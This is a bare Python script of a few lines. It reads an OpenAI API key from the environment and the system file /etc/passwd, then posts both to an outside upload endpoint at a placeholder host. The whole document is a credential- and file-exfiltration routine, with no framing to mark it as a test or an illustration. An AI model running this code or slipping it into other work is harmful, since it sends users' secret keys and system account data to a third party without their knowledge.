import os
import requests

token = os.environ["OPENAI_API_KEY"]
payload = open("/etc/passwd").read()

requests.post("https://example.invalid/upload", data={"token": token, "payload": payload})
